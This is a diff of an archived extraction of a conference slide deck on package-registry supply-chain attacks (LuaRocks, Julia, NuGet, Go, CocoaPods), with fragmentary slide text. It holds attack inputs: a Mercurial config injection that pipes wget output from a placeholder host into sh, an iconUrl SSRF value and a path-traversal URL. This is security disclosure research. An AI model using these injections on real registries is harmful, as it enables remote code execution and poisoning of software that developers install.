@@ -5,18 +5,20 @@ resource: "https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Sourc
 tags: [whitepaper, webseclist-reference]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-08T18:47:14+00:00"
+  at: "2026-08-11T17:41:27+00:00"
 status: stable
-stale_after: 2027-08-08
+stale_after: 2027-08-11
 sources:
   - id: original
     resource: "https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Source-of-the-Source.pdf"
     title: Hack the Source, Of the Source
+    author: Tsi-Lin Ng
 also_at: []
-authors: []
+authors:
+  - Tsi-Lin Ng
 canonical_url: ""
 cited_by:
-  - "2026-ai.md:114"
+  - "2026-ai.md:91"
 commit: ""
 content_sha256: e8f0ed1b202dcc530e1d17202617c7355d83187d7f0c834548e4cba421232037
 depth: full
@@ -30,8 +32,8 @@ publisher: ""
 publisher_english: ""
 raw_sha256: 1ee5557a38e2429e578f3b11763c745a38a73aca08f56aa7a17a24bbbb7839d6
 retrieved_from: "https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Source-of-the-Source.pdf"
-retrieved_kind: live
-retrieved_utc: "2026-08-08T18:47:14+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-11T17:41:27+00:00"
 slug: hack-source-source
 snapshot: ""
 title_english: ""
@@ -41,11 +43,11 @@ translation_of: ""
 
 # Hack the Source, Of the Source
 
-**Hack the Source, Of the Source** - Author not stated, Publisher not stated.
+**Hack the Source, Of the Source** - Tsi-Lin Ng, Publisher not stated.
 
 - Published: date not stated
 - Original: <https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Source-of-the-Source.pdf>
-- Preserved from: https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Source-of-the-Source.pdf (live) on 2026-08-08
+- Preserved from: https://i.blackhat.com/Asia-26/Presentations/BHAS26-Ng-Hack-the-Source-of-the-Source.pdf (stored) on 2026-08-11
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -91,6 +93,8 @@ N E S P L
                T L I N E S  P   L I T
  I N E S P L I      Average Web 󰴛.
 
+
+
                I T L I N
                        Ng E  S
                           Tsi-LinP L I
@@ -105,13 +109,6 @@ Attack
  Package
 Developer
 
-             requests          Newtonsoft.Json          express.js
-            Upload
-
-                        Package Registry
-                          PyPI, npm, RubyGems, NuGet…
- Package
-Developer
 
              requests          Newtonsoft.Json          express.js
             Upload
@@ -121,13 +118,6 @@ Developer
  Package
 Developer
 
-             requests          Newtonsoft.Json          express.js
-            Upload
-
-                        Package Registry
-                          PyPI, npm, RubyGems, NuGet…
- Package
-Developer
 
              requests          Newtonsoft.Json          express.js
             Upload
@@ -137,6 +127,7 @@ Developer
  Package
 Developer
 
+
              requests          Newtonsoft.Json          express.js
             Upload
 
@@ -144,6 +135,25 @@ Developer
                           PyPI, npm, RubyGems, NuGet…
  Package
 Developer
+
+
+             requests          Newtonsoft.Json          express.js
+            Upload
+
+                        Package Registry
+                          PyPI, npm, RubyGems, NuGet…
+ Package
+Developer
+
+
+             requests          Newtonsoft.Json          express.js
+            Upload
+
+                        Package Registry
+                          PyPI, npm, RubyGems, NuGet…
+ Package
+Developer
+
 
              requests          Newtonsoft.Json          express.js
             Upload
@@ -162,6 +172,9 @@ Developer
 Developer
                                                  Compromise
              requests          Newtonsoft.Json          express.js
+
+
+
 
                                   Poision.
             Upload
@@ -178,6 +191,9 @@ Developer
              requests
                      k         Newtonsoft.Json          express.js
 
+
+
+
                                   Poision.
               Disclaimer
 
@@ -187,16 +203,28 @@ Victim / 1/3
 $ luarocks install lua-cjson
           luarocks.org/manifest
 
+
+
  manifest.repository["lua-cjson"][<ver>]
 
+
+
     {{arch="rockspec"}, {arch="src"}}
+
+
 
 luarocks.org/lua-cjson-2.1.0.10-1.rockspec
 Tamper →         luarocks.org/manifest
 
+
+
       manifest.repository["lua-cjson"][<ver>]
 
+
+
            {{arch="rockspec"}, {arch="src"}}
+
+
 
      luarocks.org/lua-cjson-2.1.0.10-1.rockspec ← Hijack
             luarocks.org/manifest
@@ -391,19 +419,33 @@ my-evil-plugin = {  Pwned!
  },
           luarocks.org/manifest
 
+
+
  manifest.repository["lua-cjson"][<ver>]
 
+
+
     {{arch="rockspec"}, {arch="src"}}
+
+
 
 luarocks.org/lua-cjson-2.1.0.10-1.rockspec
           luarocks.org/manifest
 
+
+
  manifest.repository["lua-cjson"][<ver>]
+
+
 
     {{arch="rockspec"}, {arch="src"}}
 
+
+
 luarocks.org/lua-cjson-2.1.0.10-1.rockspec
           luarocks.org/manifest
+
+
 
  manifest.repository["lua-cjson"][<ver>]
 
@@ -412,18 +454,12 @@ luarocks.org/lua-cjson-2.1.0.10-1.rockspec
     {{arch="rockspec"},  Version
                         {arch="src"}}
 
+
+
 luarocks.org/lua-cjson-2.1.0.10-1.rockspec
            luarocks.org/manifest
 
-  manifest.repository["lua-cjson"][<ver>]
 
-lua-cjson-2.1.0.10                  1
-           Name
-     {{arch="rockspec"},          Version
-                         {arch="src"}}
-
- luarocks.org/lua-cjson-2.1.0.10-1.rockspec
-           luarocks.org/manifest
 
   manifest.repository["lua-cjson"][<ver>]
 
@@ -432,8 +468,12 @@ lua-cjson-2.1.0.10                  1
      {{arch="rockspec"},          Version
                          {arch="src"}}
 
+
+
  luarocks.org/lua-cjson-2.1.0.10-1.rockspec
            luarocks.org/manifest
+
+
 
   manifest.repository["lua-cjson"][<ver>]
 
@@ -442,10 +482,30 @@ lua-cjson-2.1.0.10                  1
      {{arch="rockspec"},          Version
                          {arch="src"}}
 
+
+
  luarocks.org/lua-cjson-2.1.0.10-1.rockspec
            luarocks.org/manifest
 
+
+
   manifest.repository["lua-cjson"][<ver>]
+
+lua-cjson-2.1.0.10                  1
+           Name
+     {{arch="rockspec"},          Version
+                         {arch="src"}}
+
+
+
+ luarocks.org/lua-cjson-2.1.0.10-1.rockspec
+           luarocks.org/manifest
+
+
+
+  manifest.repository["lua-cjson"][<ver>]
+
+
 
              Pwned!
 lua-cjson-2.1.0.10                  1
@@ -453,8 +513,12 @@ lua-cjson-2.1.0.10                  1
      {{arch="rockspec"},          Version
                          {arch="src"}}
 
+
+
  luarocks.org/lua-cjson-2.1.0.10-1.rockspec
                        luarocks.org/manifest
+
+
 
               manifest.repository["lua-cjson"][<ver>]
 
@@ -508,6 +572,8 @@ github.com/JuliaRegistries/General.git.
  [a63ad114] + Mmap
  [de0858da] + Printf
 repo_url
+
+
 
  subdir
 
@@ -638,6 +704,8 @@ api.github.com/repos/<user>/<repo>
 api.github.com/repos/<user>/<repo>
             dest = joinpath(dir, repo)
 
+
+
                         useless 😭
                 withpasswd(url) do url, env
                       run(Cmd(`git clone --bare $url $dest`; env))
@@ -652,13 +720,23 @@ api.github.com/repos/<user>/<repo>
 JuliaRegistries/Registrator.jl
                 JuliaWeb/HTTP.jl
 
+
+
+
    JuliaRegistries/Registrator.jl
+
+
 
 RCE！
              JuliaWeb/GitForge.jl
                 JuliaWeb/HTTP.jl
 
+
+
+
    JuliaRegistries/Registrator.jl
+
+
 
 RCE！
              JuliaWeb/GitForge.jl
@@ -869,14 +947,25 @@ git push
               GitHub
               Actions
 
+
+
                         GitHub Runners
+
+
+
 
            📃 Log
 git push
               GitHub
               Actions
 
+
+
+
                         Self-Hosted Runners
+
+
+
 
            📃 Log
                              Handcrafted
@@ -885,7 +974,13 @@ git push
                  GitHub
                  Actions
 
+
+
+
                            Self-Hosted Runners
+
+
+
 
      📃 Arbitrary Log
 api.github.com   /repos/X/Y/actions/…/logs
@@ -942,6 +1037,8 @@ api.github.com/repos/../hack\exp\actions\jobs\1337\logs
 api.github.com/repos/../hack\exp\actions\jobs\1337\logs
                   dest = joinpath(dir, repo)
 
+
+
                                 Pwned!
                       withpasswd(url) do url, env
                               git cloneclone
@@ -973,6 +1070,7 @@ PS> dotnet add package Newtonsoft.Json
   newtonsoft.json/index.json    /1.2.3/newtonsoft.json.1.2.3.nupkg
              📦 pkg.nupkg
 
+
        Normal.Package.nuspec
 
        lib/net48/foo.dll
@@ -987,10 +1085,14 @@ Devs                    <metadata>
                          </dependencies> </metadata> </package>
             📦 pkg.nupkg
 
+
        Normal.Package.nuspec
 
        lib/net48/foo.dll       Upload Validation
        lib/net48/bar.dll
+
+
+
 
 Devs
                                   Background
@@ -998,10 +1100,14 @@ Devs
                                   Jobs
             📦 pkg.nupkg
 
+
        Normal.Package.nuspec
 
        lib/net48/foo.dll                 Upload Validation
        lib/net48/bar.dll
+
+
+
 
                                Storage
 Devs   Normal.Package.nuspec
@@ -1013,10 +1119,14 @@ Devs   Normal.Package.nuspec
                      Blob Storage
             📦 pkg.nupkg
                                   Se l ec t i n g L o gic?
+                                ←
        Normal.Package.nuspec
 
        lib/net48/foo.dll                 Upload Validation
        lib/net48/bar.dll
+
+
+
 
                                Storage
 Devs   Normal.Package.nuspec
@@ -1034,6 +1144,8 @@ Devs   Normal.Package.nuspec
        lib/net48/foo.dll           2. Non-root → Skip
        lib/net48/bar.dll           3. *.nuspec → Select
 
+
+
                                Storage
 Devs   Normal.Package.nuspec
 
@@ -1049,6 +1161,8 @@ Devs   Normal.Package.nuspec
                                    1. Traverse files
        lib/net48/foo.dll           2. Non-root → Skip
        lib/net48/bar.dll           3. *.nuspec → Select
+
+
 
                                Storage
 Devs   Normal.Package.nuspec
@@ -1066,6 +1180,8 @@ Devs   Normal.Package.nuspec
        lib/net48/foo.dll           2. Contains "/" or "\" → Skip
        lib/net48/bar.dll           3. *.nuspec → Select
 
+
+
                                Storage
 Devs   Normal.Package.nuspec
 
@@ -1076,10 +1192,12 @@ Devs   Normal.Package.nuspec
                                              Background Job
             📦 pkg.nupkg
 
+
        Normal.Package.nuspec
 
        lib/net48/foo.dll                 Upload Validation
        lib/net48/bar.dll
+
 
                                          Inconsistence
                                Storage
@@ -1100,6 +1218,8 @@ Devs   Normal.Package.nuspec
   </dependencies>
  </metadata></package>                                      lib/net48/foo.dll
 
+
+
                                              <?xml version="1.0" encoding="utf-8"?>
                                              <package xmlns="http://schema...">
                                               <metadata>
@@ -1113,6 +1233,9 @@ sub\evil.nuspec
 Normal.Package.nuspec
 
 lib/net48/foo.dll
+
+
+
 
 sub\evil.nuspec
 
@@ -1133,6 +1256,9 @@ lib/net48/foo.dll
                                    + ID=Normal.Package   ✅
                                               Database
 
+
+
+
 sub\evil.nuspec
 
 Normal.Package.nuspec
@@ -1151,6 +1277,9 @@ Normal.Package.nuspec    ---> Archive Root -> Validates OK
 lib/net48/foo.dll
                                    + ID=Normal.Package   ✅
                                               Database
+
+
+
 
 sub\evil.nuspec
 
@@ -1235,6 +1364,7 @@ lib/net48/foo.dll
                                     + ID=Normal.Package   ✅
 
                       ob Po i sone d !         Database
+
 
   gi st r a t i on Bl
 Re                         |
@@ -1328,6 +1458,9 @@ lib/net48/foo.dll                deps = [malicious]
 
                 Blob Storage
 
+
+
+
                                              Background Job
                                                              Upload
 lib/net48/foo.dll
@@ -1392,6 +1525,8 @@ lib/net48/foo.dll                deps = [malicious]
                                  iconUrl=http://127.1
                 Blob Storage
 
+
+
                                 SSRF 🤔                    Catalog2Icon
 
                                              Background Job
@@ -1411,6 +1546,9 @@ Normal.Package.nuspec
 lib/net48/foo.dll                deps = [malicious]
                                  iconUrl=http://hack.er
                 Blob Storage
+
+
+
 
                                                           Catalog2Icon
 
@@ -1502,6 +1640,7 @@ newtonsoft.json/13.0/newtonsoft.json.13.0.nupkg/icon
                        azure://flat-container/
 newtonsoft.json/13.0/newtonsoft.json.13.0.nupkg#/icon
 
+
                                 💀                              Catalog2Icon
 
                                                   Background Job
@@ -1524,6 +1663,7 @@ newtonsoft.json/13.0/newtonsoft.json.13.0.nupkg#/icon
                     Blob Storage                             ZIP
                        azure://flat-container/
 newtonsoft.json/13.0/newtonsoft.json.13.0.nupkg#/icon
+
 
                              🤔🤔🤔                                   Catalog2Icon
 
@@ -1552,6 +1692,7 @@ newtonsoft.json/13.0/newtonsoft.json.13.0.nupkg#/icon
                         Storage                              ZIP
                        azure://flat-container/
 newtonsoft.json/13.0/newtonsoft.json.13.0.nupkg#/icon
+
 
                              🤔🤔🤔                                   Catalog2Icon
 
@@ -1587,12 +1728,16 @@ Victim 3+/3
 $ go get 'github.com/google/uuid@latest'
               GOPROXY=https://proxy.golang.org,direct
 
+
+
+
     proxy.golang.org/github.com/google/uuid/@latest
 
                                            /@v/<chosen-version>.info
                                            /@v/<chosen-version>.mod
                                            /@v/<chosen-version>.zip
 go mod download -json 'vcs.host.tld/...@main'
+
 
  <html><head>
  <meta
@@ -1607,6 +1752,9 @@ go mod download -json 'vcs.host.tld/...@main'
       content="HOST.TLD/foo/bar hg http://HG.HOST.TLD/
                   --config=alias.cat=!wget${IFS}-O-${IFS}HOST.TLD|sh;" />
 </head></html>
+
+
+
 
 hg cat -r 67beef67 --config=alias.cat=!wget${IFS}-O-${IFS}HOST.tld|sh;/go.mod
 …
@@ -1626,6 +1774,7 @@ linter:                         EvilPlugin() {
      evil_plugin:
                                 // ...
         path: ../evil_plugin
+
 
                                            pub.dev
 
@@ -1687,8 +1836,10 @@ r 'me@splitline.tw'
                                     t t ack!
                           $ pod trunk register 'me@splitline.tw'
 
+
                              hd ay A
                                                                       $ pod trunk register 'm
+
 
 rification email that
                       B
@@ -1712,6 +1863,7 @@ r 'me@splitline.tw'       $ pod trunk register 'me@splitline.tw'      $ pod trun
 the session by clicking   [!] Please verify the session by clicking   [!] Please verify the s
 rification email that     the link in the verification email that     the link in the verific
 Expected Value of Hits= 1 time collision =
+
 
       2500 × 21 mins                         2
       ———————
